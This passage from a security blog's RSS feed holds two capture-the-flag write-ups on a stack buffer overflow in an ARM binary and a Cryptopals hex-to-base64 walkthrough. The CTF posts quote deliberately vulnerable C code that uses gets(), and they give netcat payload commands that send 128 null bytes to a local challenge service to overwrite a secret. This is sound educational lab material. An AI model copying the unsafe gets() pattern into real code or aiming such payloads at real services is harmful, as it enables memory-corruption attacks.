<p>Netcat is pretty old, but it&rsquo;s reliable, and included on almost every linux distribution, which means we can usually rely on it for quick testing. Let&rsquo;s connect and see what&rsquo;s what.</p>
<p><code>nc localhost 9001</code></p>

    <figure class="left" >
        <img src="nc_guess.png"   />

        
            <figcaption class="center" >Using netcat to connect to the ARM binary.</figcaption>
        
    </figure>


<p>Netcat connects to the remote server, and displays the message asking for the secret. It then waits for input, terminated by <code>\n</code>, which is automatically sent by netcat when we press enter.</p>
<p>After that the remote program compares the secret (which is randomly generated every time it&rsquo;s run) to our input. If it doesn&rsquo;t match it sends a failure message and closes the connection.</p>
<h3 id="theres-a-slight-problem-though">There&rsquo;s a slight problem though&hellip;</h3>
<p>We can&rsquo;t send null bytes over the netcat interactive interface because it&rsquo;s a non-printable character. If we send <code>0</code>, or <code>0x0</code>, it will send <code>\x30</code> or <code>\x30\x78\x30</code> respectively.</p>
<p>The reason is, the socket doesn&rsquo;t send the actual characters, instead it sends a byte of data in binary which represents the character. One byte is represented by two hexadecimal characters, and you can look up the hexadecimal representation of each character on an <a href="http://www.asciitable.com/">ascii table</a>.</p>
<p>So the netcat interface will convert any character we enter into it&rsquo;s raw binary form, chosen off the ascii table. That&rsquo;s why <code>0x0</code> will send the byte values for each one of those characters.</p>
<h1 id="getting-around-this-issue">Getting around this issue</h1>
<p>Theres several different ways to accomplish sending non-printable characters to a socket. I&rsquo;ll cover 2 that are achievable in the command line.</p>
<h2 id="method-one---echo--e">Method One - echo -e</h2>
<p>This is the most portable version since <code>echo -e</code> will be available on all but extremely locked down/customzed linux distributions.</p>
<p>The syntax is very simple:</p>
<p><code>echo -e &quot;\x30\n&quot; | nc localhost 9001</code></p>
<p>The big problem with it, we have to manually put 128 <code>\x00</code>'s in the command. That&rsquo;s messy, but doable. Using python I can print the string I need like so:</p>
<p><code>print(b'\x00'*128 + b'\n')</code></p>

    <figure class="left" >
        <img src="big.png"   />

        
            <figcaption class="center" >Printing bytes via python for echo -e.</figcaption>
        
    </figure>


<p>Then we just copy it into our echo command.</p>
<p><code>echo -e &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\n&quot; | nc localhost 9001</code></p>

    <figure class="left" >
        <img src="image-3.png"   />

        
            <figcaption class="center" >echo -e grabbing the flag</figcaption>
        
    </figure>


<p>There it is, blanked out of course. No free flags here!</p>
<h2 id="method-2---command-line-python">Method 2 - Command Line Python</h2>
<p>So the first method works, but it&rsquo;s annoying to have to generate those characters and paste them. There could be a more efficient way to do it just using bash, but I usually just stick with Python since I&rsquo;m extremely comfortable with it.</p>
<p>Python can achieve what we need using this syntax:</p>
<p><code>python -c 'print(&quot;\x00&quot;*128 + &quot;\n&quot;)' | nc localhost 9001</code></p>
<p>That&rsquo;s a lot easier to type, and a lot nicer looking. We can invoke python with the <code>-c</code> flag to execute the statment in quotes immediately, and display the output to STDOUT. Then it&rsquo;s piped into netcat using <code>|</code>.</p>

    <figure class="left" >
        <img src="image-4.png"   />

        
            <figcaption class="center" >Using python -c to pipe output into netcat.</figcaption>
        
    </figure>


<p>There&rsquo;s the lovely flag again, with a lot less of a headache getting the command right.</p>
<p>This concludes the two part post for the ARM buffer overflow challenge. Stay tuned for a post on the next one!</p>
]]></content>
        </item>
        
        <item>
            <title>Buffer Overflow on ARM - Part 1</title>
            <link>https://foresthex.com/posts/buffer-overflow-on-arm-part-1/</link>
            <pubDate>Fri, 30 Aug 2019 20:27:30 +0000</pubDate>
            
            <guid>https://foresthex.com/posts/buffer-overflow-on-arm-part-1/</guid>
            <description>Hello again faithful readers! Today&amp;rsquo;s post is about exploiting a buffer overflow.
A few days ago I was invited to attempt some binary exploitation challenges for ARM architecture. Of course I agreed, despite the fact that I have no experience debugging ARM binaries. That&amp;rsquo;s okay though, it&amp;rsquo;s how you learn.
I was happy to see the source code provided, and even happier when I was able to quickly identify the path to success without needing a debugger at all.</description>
            <content type="html"><![CDATA[<p>Hello again faithful readers! Today&rsquo;s post is about exploiting a buffer overflow.</p>
<p>A few days ago I was invited to attempt some binary exploitation challenges for ARM architecture. Of course I agreed, despite the fact that I have no experience debugging ARM binaries. That&rsquo;s okay though, it&rsquo;s how you learn.</p>
<p>I was happy to see the source code provided, and even happier when I was able to quickly identify the path to success without needing a debugger at all. Here&rsquo;s the code:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv)
{
        <span style="color:#66d9ef">struct</span> {
                <span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">0x80</span>]; <span style="color:#75715e">//Reserves 0x80 (128) bytes in memory.
</span><span style="color:#75715e"></span>                <span style="color:#66d9ef">char</span> secret[<span style="color:#ae81ff">0x10</span>]; <span style="color:#75715e">//Reserves 0x10 (16) bytes in memory.
</span><span style="color:#75715e"></span>        } local_vars; <span style="color:#75715e">//Allows access to reserved memory.
</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">int</span> i;
        <span style="color:#66d9ef">for</span>(i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; i<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0x10</span>; i<span style="color:#f92672">++</span>) <span style="color:#75715e">//Loops 0x10 (16) times.
</span><span style="color:#75715e"></span>        {
        		<span style="color:#75715e">//Stores a random number in local_vars.secret
</span><span style="color:#75715e"></span>                local_vars.secret[i] <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span>)(random()<span style="color:#f92672">%</span><span style="color:#ae81ff">94</span><span style="color:#f92672">+</span><span style="color:#ae81ff">33</span>);
        }
        printf(<span style="color:#e6db74">&#34;Try to guess my secret:&#34;</span>);

        <span style="color:#75715e">//Saves input from STDIN in local_vars.buffer
</span><span style="color:#75715e"></span>        gets(local_vars.buffer);

        <span style="color:#75715e">//Compares values of buffer against secret, gives flag if they match.
</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>strcmp(local_vars.buffer,local_vars.secret))
        {
                printf(<span style="color:#e6db74">&#34;Congratulations, here&#39;s your flag %s&#34;</span>, FLAG);
        }
        <span style="color:#66d9ef">else</span>
        {
                printf(<span style="color:#e6db74">&#34;Failed!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;);
        }
}
</code></pre></div><p>I&rsquo;ve commented the code explaining what each piece does. Keep in mind, when numbers are defined using <code>0xn</code> notation it means they are hexadecimal numbers, so <code>0x80</code> is <code>128</code> bytes.</p>
<p>The vulnerability exists because of the function <code>gets()</code>, which has since been removed from glibc. You can read about it here: <a href="https://linux.die.net/man/3/fgets">https://linux.die.net/man/3/fgets</a></p>
<pre><code class="language-root" data-lang="root">gets() reads a line from stdin into the buffer pointed to by s until either a terminating newline or EOF,
which it replaces with a null byte ('\0').
No check for buffer overrun is performed (see BUGS below).
</code></pre><p>The gets command will continue to store values from STDIN in memory until it reaches a <code>newline</code>, <code>EOF</code>, or it runs out of memory.</p>
<hr>
<h1 id="so-how-can-we-exploit-this">So how can we exploit this?</h1>
<p>Well, seeing as we only have 128 bytes allocated for our input, once we hit the 129th byte it will continue to overwrite into the 16 bytes reserved for the <code>local_vars.secret</code> data. We can overwrite the secret with whatever value we want by sending 128 characters to input. The next 16 characters of our input will become the new value for secret.</p>
<p>The code will then compare the strings using <code>strcmp</code>, which&hellip;well&hellip; according to the man page:</p>
<blockquote>
<p>The strcmp() function compares the two strings s1 and s2.  It returns an integer less than, equal to, or greater than zero if s1 is found, respectively, to be less than, to match, or be greater than s2.</p>
</blockquote>
<p>That didn&rsquo;t really make sense to me, so I found the source code for the function to see what&rsquo;s going on. Here it is:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">STRCMP (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>p1, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>p2) <span style="color:#75715e">// p1 and p2 are memory addresses
</span><span style="color:#75715e"></span>{
  <span style="color:#75715e">//saves both addresses in new memory location
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>s1 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>) p1;
  <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>s2 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>) p2;

  <span style="color:#75715e">//allocate memory for values at addresses
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> c1, c2;
  <span style="color:#66d9ef">do</span>
    {
      c1 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span>) <span style="color:#f92672">*</span>s1<span style="color:#f92672">++</span>; <span style="color:#75715e">//saves value at address
</span><span style="color:#75715e"></span>      c2 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span>) <span style="color:#f92672">*</span>s2<span style="color:#f92672">++</span>; <span style="color:#75715e">//saves value at address
</span><span style="color:#75715e"></span>      <span style="color:#66d9ef">if</span> (c1 <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;\0&#39;</span>) <span style="color:#75715e">//check first value for null byte
</span><span style="color:#75715e"></span>
        <span style="color:#75715e">//subtract value of c1 from c2.
</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">return</span> c1 <span style="color:#f92672">-</span> c2;
    }

  <span style="color:#75715e">//keep going if it matches and there&#39;s no null byte yet
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">while</span> (c1 <span style="color:#f92672">==</span> c2);

  <span style="color:#75715e">//If it ever doesnt match, end up here.
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">return</span> c1 <span style="color:#f92672">-</span> c2;
}
</code></pre></div><p>I added comments to the code, but basically it iterates through both strings one character at a time until it hits a null byte (0) in the first string, or a character which doesn&rsquo;t match. It then returns the value of the last characters compared, subtracted from each other, which will always be 0 if it&rsquo;s a match.</p>
<p>So the takeaway here is, <code>gets()</code> won&rsquo;t stop at null bytes, but <code>strcmp()</code> will. Because of this, we can happily pass null bytes to the input, and still execute an overflow into <code>local_vars.secret</code></p>
<hr>
<h1 id="crafting-the-payload-the-magic-part">Crafting the payload (the magic part)</h1>
<p>Knowing this we can craft a payload that will overwrite <code>local_vars.secret</code> with whatever value we want, and can set our <code>local_vars.buffer</code> to the same string using null bytes to terminate it for <code>strcmp()</code>. On top of that, we can abuse the fact the <code>gets()</code> will happily save as many null bytes as we want, which means we can make both our input, and the secret, immediately terminate by setting the first byte value to 0. It will work like this:</p>
<p><code>0</code> + <code>127 bytes of whatever we want</code> + <code>\n (for newline)</code></p>
<p>That&rsquo;s 129 bytes of data, for the 128 byte buffer. Let&rsquo;s step through the logic and see why this works.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">0x80</span>]; <span style="color:#75715e">//Reserves 0x80 (128) bytes in memory.
</span><span style="color:#75715e"></span><span style="color:#66d9ef">char</span> secret[<span style="color:#ae81ff">0x10</span>]; <span style="color:#75715e">//Reserves 0x10 (16) bytes in memory.
</span></code></pre></div><p>This code reserves <code>128 bytes</code> in memory for our buffer, and 16 bytes for our secret. This is a continuous block of memory, so immediately after the 128 bytes for the buffer are the 16 bytes for the secret.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">gets(local_vars.buffer); <span style="color:#75715e">//Saves input from STDIN in memory allocated for local_vars.buffer
</span></code></pre></div><p>This accepts our input, which is <code>0</code> + <code>127 bytes of whatever</code> + <code>\n</code>, and stores it in memory starting at the address reserved for our buffer. Once it hits the <code>\n</code> value, it will know to stop copying. On top of that, it replaces the <code>\n</code> with <code>0</code>, this is simply how the function works. That&rsquo;s not something I knew off hand, I had to research the <code>gets()</code> function.</p>
<p>Since the memory allocated for the secret is immediately after the first byte of the secret is now <code>0</code> since <code>gets()</code> replaced <code>\n</code> with it.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>strcmp(local_vars.buffer,local_vars.secret))
</code></pre></div><p>This conditional statement checks if the value returned by <code>strcmp()</code> is 0. We must again refer to documentation, or in this case the source code, to understand what the function is doing.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#66d9ef">if</span> (c1 <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;\0&#39;</span>) <span style="color:#75715e">//check first value for null byte
</span></code></pre></div><p>In the above snippet from the <code>strcmp()</code> source code, it checks the first byte at the starting memory address of the first argument passed to the function, which in this case is <code>local_vars.buffer</code>. We set this byte to <code>0</code> with our payload.</p>
<p>Since the if condition is met, the following code is executed:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#66d9ef">return</span> c1 <span style="color:#f92672">-</span> c2; <span style="color:#75715e">//if null, subtract value of c1 from c2. will be 0 if same
</span></code></pre></div><p>So, it will subtract <code>c2</code> from <code>c1</code>. Well <code>c2</code> is the value at the starting memory address of the second argument passed to the function, which in this case is <code>local_vars.secret</code>. Since our payload overwrote this value by exceeding the 128 byte buffer, the value here is now <code>0</code>.</p>
<p>Well, <code>0-0 = 0</code>, so it returns 0, which means the statement <code>if(!strcmp(local_vars.buffer,local_vars.secret))</code> evaluates to true, and execution continues to this line:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">printf(<span style="color:#e6db74">&#34;Congratulations, here&#39;s your flag %s&#34;</span>, FLAG);
</code></pre></div><p>Now getting these values to the actual program is kind of tricky. <a href="https://foresthex.com/buffer-overflow-on-arm-part-2/">I made a post that goes into more detail about how to do this.</a></p>
<p>I&rsquo;m not going to leave you hanging though, the following python statement will send raw binary, represented by <code>\xNN</code> where N is a hexadecimal digit, to netcat:</p>
<p><code>python -c 'print(&quot;\x00&quot;*128 + &quot;\n&quot;)' | nc localhost 9001</code></p>

    <figure class="left" >
        <img src="arm_ctf_win.webp"   />

        
            <figcaption class="center" >Got the flag.</figcaption>
        
    </figure>


]]></content>
        </item>
        
        <item>
            <title>Cryptopals Set 1 - Challenge 1</title>
            <link>https://foresthex.com/posts/cryptopals-set-1-challenge-1/</link>
            <pubDate>Tue, 11 Jun 2019 21:14:35 +0000</pubDate>
            
            <guid>https://foresthex.com/posts/cryptopals-set-1-challenge-1/</guid>
            <description>Welcome to another Forest Hex crypto adventure! üå≤üèπ Today I will be walking through the first Cryptopals challenge.
Cryptopals is a series of cryptology related challenges broken into sets, escalating in difficulty. I was recommended to check out this site by another user in a Nintendo Switch Hacking discord server.You can find this server here: https://discord.gg/ZdqEhed
In fact, a lot of my recent drive to learn hacking was watching the Nintendo Switch hacking scene unfold.</description>
            <content type="html"><![CDATA[<h3 id="welcome-to-another-forest-hex-crypto-adventure-">Welcome to another Forest Hex crypto adventure! üå≤üèπ</h3>
<p><em>Today I will be walking through the first Cryptopals challenge.</em></p>
<p>Cryptopals is a series of cryptology related challenges broken into sets, escalating in difficulty. I was recommended to check out this site by another user in a Nintendo Switch Hacking discord server.You can find this server here: <a href="https://discord.gg/ZdqEhed">https://discord.gg/ZdqEhed</a></p>
<p>In fact, a lot of my recent drive to learn hacking was watching the Nintendo Switch hacking scene unfold. It was extremely interesting to see the breadth, and depth of knowledge that came together.</p>
<p>Anyway, on to the first challenge. Here is the description on the site:</p>
<p><a href="https://cryptopals.com/sets/1/challenges/1">https://cryptopals.com/sets/1/challenges/1</a></p>
<pre><code>Convert hex to base64
The string: 49276d206b696c6c696e6720796f757220627261696e206c696b65206120706f69736f6e6f7573206d757368726f6f6d
Should produce: SSdtIGtpbGxpbmcgeW91ciBicmFpbiBsaWtlIGEgcG9pc29ub3VzIG11c2hyb29t
So go ahead and make that happen. You'll need to use this code for the rest of the exercises.
Cryptopals Rule
Always operate on raw bytes, never on encoded strings. Only use hex and base64 for pretty-printing.
</code></pre><hr>
<p>This is a simple conversion of hex to base64. This is easily achievable with Python.</p>
<p>Something that may be easily missed: <code>Always operate on raw bytes, never on encoded strings. Only use hex and base64 for pretty-printing. </code></p>
<p>In order to achieve this:</p>
<ol>
<li>Input = Hex String</li>
<li>Convert input to bytes.</li>
<li>Convert bytes to base 64.</li>
<li>Print result.</li>
</ol>
<p>Python includes a handy way to convert a hex string to bytes: <code>bytes.fromhex()</code>
It also has a standard library <code>base64</code> which includes <code>base64.b64encode()</code>
So we simply call these functions in the right order and print the result.</p>
<p>Here is the code that achieves this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> base64
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">hex_to_b64</span>(input):
    <span style="color:#66d9ef">return</span> base64<span style="color:#f92672">.</span>b64encode(bytes<span style="color:#f92672">.</span>fromhex(input))
<span style="color:#66d9ef">print</span>(hex_to_b64(<span style="color:#e6db74">&#39;49276d206b696c6c696e6720796f757220627261696e206c696b65206120706f69736f6e6f7573206d757368726f6f6d&#39;</span>))
</code></pre></div><p>Our function properly prints</p>
<p><code>b'SSdtIGtpbGxpbmcgeW91ciBicmFpbiBsaWtlIGEgcG9pc29ub3VzIG11c2hyb29t'</code></p>
<p>The <code>b</code> in front of the string means it&rsquo;s a bytes type instead of a string.</p>
]]></content>
        </item>
        
    </channel>
</rss>
